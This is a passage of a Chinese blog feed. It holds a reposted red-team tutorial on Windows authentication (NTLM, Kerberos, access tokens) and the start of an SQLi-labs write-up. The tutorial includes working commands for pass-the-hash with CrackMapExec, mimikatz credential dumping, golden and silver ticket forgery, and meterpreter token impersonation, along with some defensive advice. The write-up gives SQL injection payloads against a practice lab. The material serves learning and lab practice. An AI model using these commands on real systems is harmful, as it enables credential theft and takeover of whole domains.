class="hljs-string">-2</span>F<span class="hljs-string">-5</span>E<span class="hljs-string">-69</span><span class="hljs-string">-7</span>C-AA-D3-B4<span class="hljs-string">-35</span>-B5<span class="hljs-string">-14</span><span class="hljs-string">-04</span>-EE</code></pre><p>在上面的产生过程中，脆弱点就在于DES的Key（<code>KGS!@#$%</code>）是固定的，也就是说，有了Key就能够解出原文。</p><p>并且根据LM Hash特征，也能够判断用户的密码是否是大于等于7位。</p><h2 id="0x01-网络认证"><a href="#0x01-网络认证" class="headerlink" title="0x01 网络认证"></a>0x01 网络认证</h2><p>在内网渗透中，经常遇到工作组环境，而工作组环境是一个逻辑 上的网络环境(工作区)，隶属于工作组的机器之间无法互相建 立一个完美的信任机制，只能点对点，是比较落后的认证方式， 没有信托机构。</p><p>假设A主机与B主机属于同一个工作组环境，A想访问B主机上的资料，需要将一个存在于B主机上的账户凭证发送至B主机，经过认证才能够访问B主机上的资源。</p><p>这是我们接触比较多的SMB共享文件的案例，SMB的默认端口是445。</p><p>早期SMB协议在网络上传输明文口令。后来出现 LAN Manager Challenge/Response 验证机制，简称LM，它是如此简单以至很容易就被破解，现在又有了NTLM以及Kerberos。</p><h3 id="NTLM-协议"><a href="#NTLM-协议" class="headerlink" title="NTLM 协议"></a>NTLM 协议</h3><p>NTLM是一种网络认证协议，它是基于挑战（Chalenge）/响应（Response）认证机制的一种认证模式。</p><p><strong>这个协议只支持Windows</strong></p><h3 id="Chalenge-Response"><a href="#Chalenge-Response" class="headerlink" title="Chalenge/Response"></a>Chalenge/Response</h3><p>NTLM协议的认证过程分为三步：</p><ul><li>协商</li><li>质询</li><li>验证</li></ul><p><strong>协商</strong>：主要用于确认双方协议版本</p><p><strong>质询</strong>：就是挑战（Chalenge）/响应（Response）认证机制起作用的范畴，本小节主要讨论这个机制的运作流程。</p><p><strong>验证</strong>：验证主要是在质询完成后，验证结果，是认证的最后一步。</p><p>质询的完整过程：</p><ul><li>1.客户端向服务器端发送用户信息(用户名)请求</li><li>2.服务器接受到请求，生成一个16位的随机数，被称之为“Challenge”， 使用登录用户名对应的NTLM Hash加密Challenge(16位随机字符)， 生成Challenge1。同时，生成Challenge1后，将Challenge(16位随机 字符)发送给客户端。</li><li>3.客户端接受到Challenge后，使用将要登录到账户对应的NTLM Hash加密Challenge生成Response，然后将Response发送至服务器端。</li></ul><p>其中，经过NTLM Hash加密Challenge的结果在网络协议中称之为Net NTLM Hash。</p><p>验证： 服务器端收到客户端的Response后，比对Chanllenge1与Response是否相等，若相等，则认证通过。</p><p>使用另外一种方式解读：</p><p>1.Server接收到Client发送的用户名后，判断本地账户列 表是否有用户名share_user</p><ul><li>如果没有，返回认证失败</li><li>如果有，生成Chanllenge，并且从本地查找share_user对 应的NTLM Hash，使用NTLM Hash加密Chanllenge，生成一 个Net-NTLM Hash存在内存中，并将Chanllenge发送给Client。</li></ul><p>2.Client接收到Chanllenge后，将自己提供的share_user的密码转换为NTLM Hash，使用NTLM Hash加密Chanllenge， 这个结果叫Response，表现形式是Net-NTLM Hash，最后将Response发送给Server。</p><p>3.Server接收到Client发送的Response，将Response与之 前的Net-NTLM Hash进行比较，如果相等，则认证通过。</p><p>注意:</p><p>1.Chanllenge是Server产生的一个16字节的随机数，每次认证都不同</p><p>2.Response的表现形式是Net-NTLM Hash，它是由客户端 提供的密码Hash加密Server返回的Chanllenge产生的结果。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20190512_%E5%BD%BB%E5%BA%95%E7%90%86%E8%A7%A3Windows%E8%AE%A4%E8%AF%81/01.png" alt="NTLM 协议"></p><h3 id="NTLM-V2协议"><a href="#NTLM-V2协议" class="headerlink" title="NTLM V2协议"></a>NTLM V2协议</h3><p>NTLM v1与NTLM v2最显著的区别就是Challenge与加密算法不同，共同点就是加密的原料都是NTLM Hash。</p><p>下面细说一下有什么不同:</p><ul><li>Challage:NTLM v1的Challenge有8位，NTLM v2的Challenge为16位。</li><li>Net-NTLM Hash:NTLM v1的主要加密算法是DES，NTLM v2的主要加密算法是HMAC-MD5。</li></ul><p>现在应该能够理解什么是NTLM、NTLM Hash、LM、LM Hash、Net NTLM Hash了吧？</p><h3 id="Pass-The-Hash"><a href="#Pass-The-Hash" class="headerlink" title="Pass The Hash"></a>Pass The Hash</h3><p>在内网渗透中，我们经常会需要抓取管理员的密码、NTLM Hash，通过搜集这些信息有助于我们扩大战果，尤其是在域环境下。</p><ul><li>什么是哈希传递?</li></ul><p>哈希传递是能够在不需要账户明文密码的情况下完成认证的一个技术。</p><ul><li>哈希传递的作用?</li></ul><p>解决了我们渗透中获取不到明文密码、破解不了NTLM Hash而又 想扩大战果的问题。</p><p><strong>Pass The Hash - 必要条件</strong></p><ul><li>哈希传递需要被认证的主机能够访问到服务器(废话)</li><li>哈希传递需要被传递认证的用户名</li><li>哈希传递需要被传递认证用户的NTLM Hash</li></ul><p>要完成一个NTLM认证，第一步需要客户端将自己要参与认证的 用户名发送至服务器端，等待服务器端给出的Challenge⋯⋯</p><p>其实哈希传递就是使用用户名对应的NTLM Hash将服务器给出的 Chanllenge加密，生成一个Response，来完成认证。</p><p>Pass The Hash能够完成一个不需要输入密码的NTLM协议认证流程，所以不算是一个漏洞，算是一个技巧。</p><p>Pass The Hash的工具：</p><ul><li>Smbmap</li><li>CrackMapExec</li><li>Smbexec</li><li>Metasploit</li></ul><p>使用CrackMapExec实现Hash传递：</p><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@kali:~/cache# cme smb <span class="hljs-number">192.168.3.5</span> -u administrator -H dab<span class="hljs-number">7</span>de<span class="hljs-number">8</span>feeb<span class="hljs-number">5</span>ecac<span class="hljs-number">65</span>faf<span class="hljs-number">9</span>fdc<span class="hljs-number">6</span>cac<span class="hljs-number">3</span>a<span class="hljs-number">9</span> -x whoami<span class="hljs-attribute">SMB</span> <span class="hljs-number">192.168.3.5</span> <span class="hljs-number">445</span> LIYINGZHEA<span class="hljs-number">30</span>B[*] Windows 7 Ultimate 7601 Service Pack 1 x64 (name:LIYINGZHEA30B)(domain:PAYLOADS) (signing:False) (SMBv1:True)<span class="hljs-attribute">SMB</span> <span class="hljs-number">192.168.3.5</span> <span class="hljs-number">445</span> LIYINGZHEA<span class="hljs-number">30</span>B[+] PAYLOADS\administrator dab7de8feeb5ecac65faf9fdc6cac3a9(Pwn3d!)SMB 192.168.3.5 445 LIYINGZHEA30B [+] Executed command</code></pre><h2 id="0x02-Kerberos域认证"><a href="#0x02-Kerberos域认证" class="headerlink" title="0x02 Kerberos域认证"></a>0x02 Kerberos域认证</h2><h3 id="Active-Directory-活动目录-概念"><a href="#Active-Directory-活动目录-概念" class="headerlink" title="Active Directory(活动目录)概念"></a>Active Directory(活动目录)概念</h3><p>Windows提供了为企业管理资产、服务、网络对象进行组织化的管理，这非常符合企业架构的管理模式。而承载这些管理机制的就是活动目录服务。如果要搭建一个域，就需要安装活动目录服务，当然，这个不在我们的讨论范围。</p><p>活动目录服务以域名来划分域的边界，域外就不属于管理范围了，也就是说，一个域对应一个域名，域之间也可以相互信任。</p><ul><li>Active Directory存储了有关网络对象的信息，并且让管理员和用 户能够轻松地查找和使用这些信息。Active Directory使用了一种 结构化的数据存储方式，并以此作为基础对目录信息进行合乎逻 辑的分层组织。</li><li>网络对象分为:用户、用户组、计算机、域、组织单位以及安全 策略等。</li></ul><h3 id="Active-Directory-活动目录-功能"><a href="#Active-Directory-活动目录-功能" class="headerlink" title="Active Directory(活动目录)功能"></a>Active Directory(活动目录)功能</h3><ul><li>服务器及客户端计算机管理:管理服务器及客户端计算机账户， 所有服务器及客户端计算机加入域管理并实施组策略。</li><li>用户服务:管理用户域账户、用户信息、企业通讯录(与电子邮 件系统集成)、用户组管理、用户身份认证、用户授权管理等， 按省实施组管理策略。</li><li>资源管理:管理打印机、文件共享服务等网络资源。</li><li>桌面配置:系统管理员可以集中的配置各种桌面配置策略，如: 用户使用域中资源权限限制、界面功能的限制、应用程序执行特 征限制、网络连接限制、安全配置限制等。</li><li>应用系统支撑:支持财务、人事、电子邮件、企业信息门户、办 公自动化、补丁管理、防病毒系统等各种应用系统。</li></ul><p>在域中，网络对象可以相互访问，但是在真实情况中，需要对某些部门的计算机进行限制，例如：销售部门不能访问技术部门的服务器。</p><p>这个中间就需要Kerberos认证协议来验证网络对象间的权限。</p><h3 id="域认证体系-Kerbroes"><a href="#域认证体系-Kerbroes" class="headerlink" title="域认证体系 - Kerbroes"></a>域认证体系 - Kerbroes</h3><p>Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客 户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不 依赖于主机操作系统的认证，无需基于主机地址的信任，不要求 网络上所有主机的物理安全，并假定网络上传送的数据包可以被 任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一 种可信任的第三方认证服务，是通过传统的密码技术(如:共享 密钥)执行认证服务的。</p><h3 id="域认证所参与的角色-三只狗头"><a href="#域认证所参与的角色-三只狗头" class="headerlink" title="域认证所参与的角色 (三只狗头)"></a>域认证所参与的角色 (三只狗头)</h3><p>Kerberos的标志是三只狗头，狗头分别代表以下角色：</p><ul><li>Client</li><li>Server</li><li>KDC(Key Distribution Center) = DC(Domain Controller)</li></ul><p>Kerberos认证协议的基础概念：</p><p>票据（Ticket）：是网络对象互相访问的凭证。 TGT（Ticket Granting Ticket）：入场券，通过入场券能够获得票据，是一种临时凭证的存在。</p><p>KDC负责管理票据、认证票据、分发票据，但是KDC不是一个独立的服务，它由以下服务组成：</p><ul><li>Authentication Service: 为client生成TGT的服务</li><li>Ticket Granting Service: 为client生成某个服务的ticket</li></ul><p>另外还需要介绍一个类似于本机SAM的一个数据库：AD，全称叫account database，存储所有client的白名单，只有存 在于白名单的client才能顺利申请到TGT。</p><p>从物理层面看，AD与KDC均为域控制器(Domain Controller)。</p><h3 id="域认证粗略流程"><a href="#域认证粗略流程" class="headerlink" title="域认证粗略流程"></a>域认证粗略流程</h3><ol><li>client向kerberos服务请求，希望获取访问server的权限。 kerberos得到了这个消息，首先得判断client是否是可信赖的， 也就是白名单黑名单的说法。这就是AS服务完成的工作，通过 在AD中存储黑名单和白名单来区分client。成功后，返回AS返 回TGT给client。</li><li>client得到了TGT后，继续向kerberos请求，希望获取访问 server的权限。kerberos又得到了这个消息，这时候通过client 消息中的TGT，判断出了client拥有了这个权限，给了client访 问server的权限ticket。</li><li>client得到ticket后，终于可以成功访问server。这个ticket只是 针对这个server，其他server需要向TGS申请。</li></ol><h3 id="域认证"><a href="#域认证" class="headerlink" title="域认证"></a>域认证</h3><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20190512_%E5%BD%BB%E5%BA%95%E7%90%86%E8%A7%A3Windows%E8%AE%A4%E8%AF%81/02.png" alt="域认证"></p><p>首先，客户端需要发送自己的身份信息到KDC，身份信息中起码包含用户名，KDC根据用户名在AD中寻找是否在白名单中，然后根据用户名提取到对应的NTLM Hash。</p><p>KDC此时生成一个随机字符串，叫Session Key，使用用户名对应的NTLM Hash加密Session Key，作为AS数据，使用KDC中某个用户的NTLM Hash加密Session Key和客户端的信息，生成TGT。</p><ul><li>Session Key用于客户端向TGS服务通信。</li><li>域内所有网络对象的凭证都在AD中保存</li><li>KDC中某个用户指的是krbtgt</li></ul><p>数据结构：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20190512_%E5%BD%BB%E5%BA%95%E7%90%86%E8%A7%A3Windows%E8%AE%A4%E8%AF%81/03.png" alt="域认证"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20190512_%E5%BD%BB%E5%BA%95%E7%90%86%E8%A7%A3Windows%E8%AE%A4%E8%AF%81/04.png" alt="域认证"></p><p>其中，TGT的到期时间为8小时，如果超过了8小时，还需要重新申请TGT，不能之间进入下一步获取Ticket。</p><p>Kerberos是一个假设网络环境不安全的情况下能够正常进行认证工作的协议。</p><p>第一步中，KDC返回的TGT客户端是无法解密的，因为它没有KDC Hash，如果有，我们就可以伪造黄金票据，这个是后话了。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20190512_%E5%BD%BB%E5%BA%95%E7%90%86%E8%A7%A3Windows%E8%AE%A4%E8%AF%81/05.png" alt="域认证"></p><p>第二步客户端需要提供TGT与第一步中使用自己NTLM Hash解密出来的Session Key加密的客户端信息跟时间戳。</p><p>如果假设这个数据被中间人窃取到，也无法在段时间内破解，因为KDC会校验时间戳。</p><p>KDC接到TGT与其他内容后，会首先解密TGT，只有KDC可以解密TGT，从TGT中提取到Session Key，再使用Session Key解密其他内容，解密出来的内容同TGT中的信息进行校验来确认客户端是否受信。</p><p>验证通过后，就会生成一个新的Session Key，我们称之为Server Session Key，这个Server Session Key主要用于和服务器进行通信。同时还会生成一个Ticket，也就是最后的票据了。</p><p>Ticket组成如下：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20190512_%E5%BD%BB%E5%BA%95%E7%90%86%E8%A7%A3Windows%E8%AE%A4%E8%AF%81/06.png" alt="域认证"></p><p>Server Hash：这个Hash是在AD中服务器计算机的NTLM Hash。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20190512_%E5%BD%BB%E5%BA%95%E7%90%86%E8%A7%A3Windows%E8%AE%A4%E8%AF%81/07.png" alt="域认证"></p><p>在第三步里，客户端向服务器请求，需要提供Ticket，Server Session Key加密的客户端信息与时间戳。</p><ul><li>Ticket客户端无法解密</li><li>服务器端通过解密Ticket解密Server Session Key(Client info + Timestamp)</li><li>比较时间长度</li></ul><p>校验通过后，认证成功，该票据会一直存在客户端内存中。</p><h3 id="白银票据-Silver-Tickets"><a href="#白银票据-Silver-Tickets" class="headerlink" title="白银票据(Silver Tickets)"></a>白银票据(Silver Tickets)</h3><p>白银票据特点:</p><ul><li>1.不需要与KDC进行交互</li><li>2.需要目标服务的NTLM Hash</li></ul><p>在第三步认证中的Ticket的组成:</p><pre><code class="hljs pgsql">Ticket=<span class="hljs-keyword">Server</span> Hash(<span class="hljs-keyword">Server</span> <span class="hljs-keyword">Session</span> Key+Client <span class="hljs-keyword">info</span>+<span class="hljs-keyword">End</span> <span class="hljs-type">Time</span>) </code></pre><p>当拥有Server Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket。</p><p><strong>PS:Server Session Key在未发送Ticket之前，服务器是不知道Server Session Key是什么的。 所以，一切凭据都来源于Server Hash。</strong></p><h3 id="伪造白银票据-Silver-Tickets"><a href="#伪造白银票据-Silver-Tickets" class="headerlink" title="伪造白银票据(Silver Tickets)"></a>伪造白银票据(Silver Tickets)</h3><p>首先需要导出Server Hash：</p><pre><code class="hljs vim">C:\<span class="hljs-keyword">files</span>&gt;mimikatz.<span class="hljs-keyword">exe</span> <span class="hljs-string">&quot;privilege::debug” &quot;</span>sekurls<span class="hljs-variable">a:</span>:logonpasswords<span class="hljs-string">&quot; &quot;</span><span class="hljs-keyword">exit</span><span class="hljs-comment">&quot; &gt; log.txt</span></code></pre><p>伪造票据:</p><pre><code class="hljs elixir">mimikatz “kerberos::golden /<span class="hljs-symbol">domain:</span>&lt;域名&gt; <span class="hljs-regexp">/sid:&lt;域 SID&gt; /target</span><span class="hljs-symbol">:&lt;</span>目标服务器主机名&gt; <span class="hljs-regexp">/service:&lt;服务类型&gt; /rc</span>4<span class="hljs-symbol">:&lt;NTLM</span> Hash&gt; <span class="hljs-regexp">/user:&lt;用户名&gt; /ptt</span><span class="hljs-string">&quot; exit</span><span class="hljs-string"></span></code></pre><p>Other：</p><ul><li>kerberos::list #列出票据</li><li>kerberos::purge # 清除票据</li></ul><p>由于白银票据需要目标服务器的Hash，所以没办法生成对应域内 所有服务器的票据，也不能通过TGT申请。因此只能针对服务器 上的某些服务去伪造，伪造的服务类型列表如下:</p><table><thead><tr><th>服务注释</th><th>服务名</th></tr></thead><tbody><tr><td>WMI</td><td>HOST、RPCSS</td></tr><tr><td>Powershell Remoteing</td><td>HOST、HTTP</td></tr><tr><td>WinRM</td><td>HOST、HTTP</td></tr><tr><td>Scheduled Tasks</td><td>HOST</td></tr><tr><td>LDAP 、DCSync</td><td>LDAP</td></tr><tr><td>Windows File Share (CIFS)</td><td>CIFS</td></tr><tr><td>Windows Remote ServerAdministration Tools</td><td>RPCSS、LDAP、CIFS</td></tr></tbody></table><h3 id="白银票据-Silver-Tickets-演示"><a href="#白银票据-Silver-Tickets-演示" class="headerlink" title="白银票据(Silver Tickets)演示"></a>白银票据(Silver Tickets)演示</h3><h3 id="白银票据-Silver-Tickets-防御"><a href="#白银票据-Silver-Tickets-防御" class="headerlink" title="白银票据(Silver Tickets)防御"></a>白银票据(Silver Tickets)防御</h3><ul><li>1.尽量保证服务器凭证不被窃取</li><li>2.开启PAC (Privileged Attribute Certificate) 特权属性证书保护 功能，PAC主要是规定服务器将票据发送给kerberos服务，由 kerberos服务验证票据是否有效。</li></ul><p>开启方式:</p><p>将注册表中</p><pre><code class="hljs taggerscript">HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>YSTEM <span class="hljs-symbol">\ </span>CurrentControlSet<span class="hljs-symbol">\C</span>ontrol<span class="hljs-symbol">\L</span>sa<span class="hljs-symbol">\K</span>erberos<span class="hljs-symbol">\P</span>arameters</code></pre><p>中的<code>ValidateKdcPacSignature</code>设置为1。</p><h3 id="黄金票据-Golden-Tickets"><a href="#黄金票据-Golden-Tickets" class="headerlink" title="黄金票据(Golden Tickets)"></a>黄金票据(Golden Tickets)</h3><p>黄金票据特点:</p><ul><li>1.需要与DC通信</li><li>2.需要krbtgt用户的hash</li></ul><p><strong>PS:这里的krbtgt hash就是之前讲的KDC Hash</strong></p><h3 id="黄金票据-Golden-Tickets-MSF-kiwi"><a href="#黄金票据-Golden-Tickets-MSF-kiwi" class="headerlink" title="黄金票据(Golden Tickets)-MSF kiwi"></a>黄金票据(Golden Tickets)-MSF kiwi</h3><p>使用meterpreter中的kiwi模块：</p><pre><code class="hljs ebnf"><span class="hljs-attribute">load kiwi</span></code></pre><p>创建票据：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20190512_%E5%BD%BB%E5%BA%95%E7%90%86%E8%A7%A3Windows%E8%AE%A4%E8%AF%81/08.png" alt="黄金票据"></p><p>注入到内存：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20190512_%E5%BD%BB%E5%BA%95%E7%90%86%E8%A7%A3Windows%E8%AE%A4%E8%AF%81/09.png" alt="黄金票据"></p><p>使用wmic在目标服务器上创建一个进程：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20190512_%E5%BD%BB%E5%BA%95%E7%90%86%E8%A7%A3Windows%E8%AE%A4%E8%AF%81/10.png" alt="黄金票据"></p><h3 id="黄金票据-Golden-Tickets-伪造"><a href="#黄金票据-Golden-Tickets-伪造" class="headerlink" title="黄金票据(Golden Tickets) - 伪造"></a>黄金票据(Golden Tickets) - 伪造</h3><p>伪造票据:</p><pre><code class="hljs elixir">mimikatz “kerberos::golden /<span class="hljs-symbol">domain:</span>&lt;域名&gt; <span class="hljs-regexp">/sid:&lt;域SID&gt; /rc</span>4<span class="hljs-symbol">:&lt;KRBTGT</span> NTLM Hash&gt; <span class="hljs-regexp">/user:&lt;任意用户名&gt; /ptt</span><span class="hljs-string">&quot; exit</span><span class="hljs-string"></span></code></pre><h3 id="黄金票据-Golden-Tickets-演示"><a href="#黄金票据-Golden-Tickets-演示" class="headerlink" title="黄金票据(Golden Tickets) - 演示"></a>黄金票据(Golden Tickets) - 演示</h3><h3 id="Tickets-总结"><a href="#Tickets-总结" class="headerlink" title="Tickets 总结"></a>Tickets 总结</h3><ul><li>黄金票据:从攻击面来看，获取krbtgt用户的hash后，可以在域中 进行持久性的隐藏，并且日志无法溯源，但是需要拿到DC权限， 使用黄金票据能够在一个域环境中长时间控制整个域。</li><li>从防御角度来看，需要经常更新krbtgt的密码，才能够使得原有的 票据失效。最根本的办法是不允许域管账户登录其他服务器。</li><li>白银票据:从攻击面来看，伪造白银票据的难度比伪造黄金票据的 难度较小，因为一个域中的服务器如果对外的话，非常容易被入侵， 并且容易被转储Server。</li><li>从防御角度来看，需要开启PAC认证，但这会降低认证效率，增加 DC的负担，最根本的还是要加固服务器本身对外的服务。</li></ul><h2 id="0x03-Windows-Access-Token"><a href="#0x03-Windows-Access-Token" class="headerlink" title="0x03 Windows Access Token"></a>0x03 Windows Access Token</h2><h3 id="Windows-Access-Token-简介"><a href="#Windows-Access-Token-简介" class="headerlink" title="Windows Access Token 简介"></a>Windows Access Token 简介</h3><p>Windows Token其实叫Access Token(访问令牌)，它是一个描 述进程或者线程安全上下文的一个对象。不同的用户登录计算机后， 都会生成一个Access Token，这个Token在用户创建进程或者线程 时会被使用，不断的拷贝，这也就解释了A用户创建一个进程而该 进程没有B用户的权限。</p><p>Access Token种类：</p><ul><li>主令牌</li><li>模拟令牌</li></ul><p>一般情况下，用户双击运行一个程序，都会拷贝“explorer.exe”的Access Token。</p><p>当用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只有在重启机器后才会清除。</p><h3 id="Windows-Access-Token组成"><a href="#Windows-Access-Token组成" class="headerlink" title="Windows Access Token组成"></a>Windows Access Token组成</h3><ul><li>用户帐户的安全标识符(SID)</li><li>用户所属的组的SID</li><li>用于标识当前登录会话的登录SID</li><li>用户或用户组所拥有的权限列表</li><li>所有者SID</li><li>主要组的SID</li><li>访问控制列表</li><li>访问令牌的来源</li><li>令牌是主要令牌还是模拟令牌</li><li>限制SID的可选列表</li><li>目前的模拟等级</li><li>其他统计数据</li></ul><h3 id="Windows-Access-Token-–-SID-Security-Identifiers-安全标识符"><a href="#Windows-Access-Token-–-SID-Security-Identifiers-安全标识符" class="headerlink" title="Windows Access Token – SID (Security Identifiers)安全标识符"></a>Windows Access Token – SID (Security Identifiers)安全标识符</h3><p>安全标识符是一个唯一的字符串，它可以代表一个账户、一个用户 组、或者是一次登录。通常它还有一个SID固定列表，例如 Everyone这种已经内置的账户，默认拥有<a href="https://docs.microsoft.com/zh-%20cn/windows/desktop/SecAuthZ/well-known-sids">固定的SID</a>。</p><p>SID的表现形式:</p><ul><li>域SID-用户ID</li><li>计算机SID-用户ID</li><li>SID列表都会存储在域控的AD或者计算机本地账户数据库中。</li></ul><h3 id="Windows-Access-Token产生过程"><a href="#Windows-Access-Token产生过程" class="headerlink" title="Windows Access Token产生过程"></a>Windows Access Token产生过程</h3><p>每个进程创建时都会根据登录会话权限由LSA(Local Security Authority)分配一个Token(如果CreaetProcess时自己指定了 Token, LSA会用该Token， 否则就用父进程Token的一份拷贝。</p><h3 id="Windows-Access-Token令牌假冒实战"><a href="#Windows-Access-Token令牌假冒实战" class="headerlink" title="Windows Access Token令牌假冒实战"></a>Windows Access Token令牌假冒实战</h3><p><strong>当用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清 除，只有在重启机器后才会清除。</strong></p><p>可以使用多种工具查看目前系统上存在的模拟令牌:</p><ul><li>Incognito</li><li>Powershell - Invoke-TokenManipulation.ps1</li><li>Cobalt Strike - steal_token</li></ul><p>案例(针对某跨国企业的一次渗透测试 获取DC权限）: <a href="http://blog.360ec.net/archives/32/">http://blog.360ec.net/archives/32/</a></p><h3 id="Windows-Access-Token令牌假冒实战-1"><a href="#Windows-Access-Token令牌假冒实战-1" class="headerlink" title="Windows Access Token令牌假冒实战"></a>Windows Access Token令牌假冒实战</h3><pre><code class="hljs taggerscript">meterpreter &gt; getsystemmeterpreter &gt; load incognito meterpreter &gt; list_tokens –uDelegation Tokens Available ============================== NT AUTHORITY<span class="hljs-symbol">\L</span>OCAL SERVICENT AUTHORITY<span class="hljs-symbol">\N</span>ETWORK SERVICENT AUTHORITY<span class="hljs-symbol">\S</span>YSTEM PAYLOADS<span class="hljs-symbol">\A</span>dministrator PAYLOADS<span class="hljs-symbol">\w</span>7meterpreter &gt; impersonate_token &quot;PAYLOADS<span class="hljs-symbol">\A</span>dministrator”[+] Delegation token available[+] Successfully impersonated user PAYLOADS<span class="hljs-symbol">\A</span>dministrator</code></pre><h3 id="Windows-Access-Token令牌假冒防御"><a href="#Windows-Access-Token令牌假冒防御" class="headerlink" title="Windows Access Token令牌假冒防御"></a>Windows Access Token令牌假冒防御</h3><p>禁止Domain Admins登录对外且未做安全加固的服务器，因为一旦服务器被入侵，域管理员的令牌可能会被攻击者假冒，从控制DC。</p><p>如果想清除假冒，重启服务器即可。</p><h2 id="0x04-知识点总结"><a href="#0x04-知识点总结" class="headerlink" title="0x04 知识点总结"></a>0x04 知识点总结</h2><p>本次议题围绕着Windows认证分别讲解了Pass The Hash、Silver Tickets、Golden Tickets、 Impersonation Token的原理。 这些技术分别能够满足我们在渗透中持续的维持权限、提权。</p><p>可拓展:</p><p>域渗透技术/思路，SPN扫描，Red/Blue team</p><ul><li><a href="https://lolbas-project.github.io/">https://lolbas-project.github.io/</a></li><li><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></li><li><a href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming</a></li></ul><p><strong>转载自：</strong></p><p><a href="https://payloads.online/archivers/2018-11-30/1">https://payloads.online/archivers/2018-11-30/1</a></p>]]></content>
    
    
    <categories>
      
      <category>红队攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>域渗透</tag>
      
      <tag>Windows认证</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQLI labs 靶场笔记之进阶挑战 54-65 关</title>
    <link href="/p/32046ada.html"/>
    <url>/p/32046ada.html</url>
    
    <content type="html"><![CDATA[<h1 id="进阶挑战-54-65-关"><a href="#进阶挑战-54-65-关" class="headerlink" title="进阶挑战 54-65 关"></a>进阶挑战 54-65 关</h1><h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>简单源码分析：</p><pre><code class="hljs Php"><span class="hljs-keyword">if</span> reset:    <span class="hljs-comment"># 根据时间戳生成 cookie</span>    setcookie(<span class="hljs-string">&#x27;challenge&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, time() - <span class="hljs-number">3600000</span>);<span class="hljs-keyword">else</span>:    <span class="hljs-keyword">if</span> cookie 中有 challenge:        <span class="hljs-variable">$sessid</span>=<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;challenge&#x27;</span>];    <span class="hljs-keyword">else</span>:        <span class="hljs-comment"># 生成 cookie </span>        <span class="hljs-variable">$expire</span> = time()+<span class="hljs-number">60</span>*<span class="hljs-number">60</span>*<span class="hljs-number">24</span>*<span class="hljs-number">30</span>;        <span class="hljs-variable">$hash</span> = data(<span class="hljs-variable">$table</span>,<span class="hljs-variable">$col</span>);        setcookie(<span class="hljs-string">&quot;challenge&quot;</span>, <span class="hljs-variable">$hash</span>, <span class="hljs-variable">$expire</span>);    <span class="hljs-keyword">if</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]:        计数器 + <span class="hljs-number">1</span>        <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM security.users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;    <span class="hljs-keyword">if</span> 有查询成功:        输出查询信息    <span class="hljs-keyword">else</span>：        啥都不输出<span class="hljs-comment"># key 被双重过滤了</span><span class="hljs-variable">$key</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>]);<span class="hljs-variable">$key</span> = mysql_real_escape_string(<span class="hljs-variable">$key</span>);<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT 1 FROM <span class="hljs-subst">$table</span> WHERE <span class="hljs-subst">$col1</span>= &#x27;<span class="hljs-subst">$key</span>&#x27;&quot;</span>;</code></pre><p>代码中可以分享出，得让我们在 10 次注入测试中拿到 key 值。看了源码可以直接联合查询，10 次以内拿到 key 感觉问题不大，那么尝试看看吧：</p><p><strong>判断闭合方式</strong></p><pre><code class="hljs sql">?id=1&#x27;<span class="hljs-comment">--+</span></code></pre><p><strong>判断字段数</strong></p><pre><code class="hljs sql">?id=1&#x27; order by 3<span class="hljs-comment">--+</span>?id=1&#x27; order by 4<span class="hljs-comment">--+</span></code></pre><p><strong>查询有可注入的字段</strong></p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><p>字段数 2,3</p><p><strong>查询表名</strong></p><pre><code class="hljs sql">?id=-1&#x27; union <span 